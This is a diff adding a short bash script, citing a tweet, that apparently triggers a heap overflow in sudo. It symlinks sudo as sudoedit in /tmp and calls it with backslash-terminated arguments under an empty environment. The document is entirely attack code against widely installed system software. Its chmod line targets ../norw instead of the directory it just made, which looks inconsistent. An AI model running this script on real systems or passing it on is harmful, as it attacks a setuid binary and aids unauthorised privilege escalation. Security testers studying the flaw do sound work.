@@ -1,0 +1,14 @@
+#!/bin/bash
+
+# Reference: https://twitter.com/hackerfantastic/status/1356645638151303169
+cd /tmp
+
+mkdir norw
+
+ln -s /usr/bin/sudo ./sudoedit
+
+chmod 555 ../norw
+
+env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f\' ./sudoedit -s '1234567890123456789012\'
+
+ls -al `which sudo`
